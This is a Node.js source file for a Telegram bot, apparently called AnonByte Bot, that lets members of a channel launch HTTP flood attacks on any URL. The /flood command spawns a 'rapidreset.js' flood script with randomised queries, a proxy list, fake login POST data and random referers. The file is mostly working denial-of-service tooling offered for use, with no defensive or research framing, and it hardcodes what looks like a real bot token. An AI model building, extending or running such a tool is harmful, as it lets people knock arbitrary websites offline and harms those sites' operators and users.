const TelegramBot = require('node-telegram-bot-api');
const { spawn } = require('child_process');

const token = '7391044972:AAFZhbYbAgLkHfmnPrIE_U0O3tBclUPRXZs'; // Replace with real token
const requiredChannel = '@ByteHammer';

const bot = new TelegramBot(token, { polling: true });

let isRunning = false;
let currentUser = null;
let processRef = null;
let currentTarget = null;
let floodStartTime = null;

function formatSeconds(sec) {
  const m = Math.floor(sec / 60);
  const s = sec % 60;
  return `${m > 0 ? m + 'm ' : ''}${s}s`;
}

bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id,
    `👋 *Welcome to AnonByte Bot!*\n\nJoin ${requiredChannel} to use this bot.\n\nCommands:\n🚀 /flood <url> <time>\n📡 /ongoing`, { parse_mode: "Markdown" });
});

bot.onText(/\/flood (.+) (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const url = match[1];
  const time = parseInt(match[2]);

  try {
    const member = await bot.getChatMember(requiredChannel, userId);
    if (['left', 'kicked'].includes(member.status)) {
      return bot.sendMessage(chatId, `❌ You must join ${requiredChannel} to launch flood attacks.`);
    }
  } catch {
    return bot.sendMessage(chatId, `⚠️ Couldn't verify your membership in ${requiredChannel}.`);
  }

  if (time > 60) return bot.sendMessage(chatId, `⏱️ Max flood time is *60 seconds*!`, { parse_mode: "Markdown" });
  if (isRunning) return bot.sendMessage(chatId, `⚙️ Flood already running by user ID *${currentUser}*.\nUse /ongoing to view.`, { parse_mode: "Markdown" });

  const args = [
    'rapidreset.js', 'GET', `${url}?q=%RAND%`, '61', '64', '90', 'c.txt',
    '--query', '1',
    '--cookie', 'uh=good',
    '--delay', '0',
    '--bfm', 'true',
    '--referer', 'rand',
    '--postdata', 'user=f&pass=%RAND%',
    '--debug',
    '--randrate',
    '--full'
  ];

  // Cap CPU with `cpulimit` (Linux) - Ensure cpulimit is installed
  processRef = spawn('cpulimit', ['--limit=70', '--', 'node', ...args]);

  isRunning = true;
  currentUser = userId;
  currentTarget = url;
  floodStartTime = Date.now();

  bot.sendMessage(chatId, `🚀 Flood started on:\n🌐 *${url}*\n⏳ Duration: *${time}s*\n\nUse /ongoing to view status.`,
    { parse_mode: "Markdown" });

  processRef.on('exit', () => {
    if (!isRunning) return;
    bot.sendMessage(chatId, `✅ Flood on *${url}* completed.`, { parse_mode: "Markdown" });
    resetState();
  });

  setTimeout(() => {
    if (processRef) {
      processRef.kill('SIGINT');
    }
  }, time * 1000);
});

bot.onText(/\/ongoing/, (msg) => {
  if (!isRunning) return bot.sendMessage(msg.chat.id, `📭 No flood is currently running.`);
  const elapsed = Math.floor((Date.now() - floodStartTime) / 1000);
  bot.sendMessage(msg.chat.id,
    `📡 *Flood in progress:*\n🌐 Target: *${currentTarget}*\n👤 User ID: *${currentUser}*\n⏱️ Elapsed: *${formatSeconds(elapsed)}*`,
    { parse_mode: "Markdown" });
});

function resetState() {
  isRunning = false;
  currentUser = null;
  currentTarget = null;
  floodStartTime = null;
  processRef = null;
}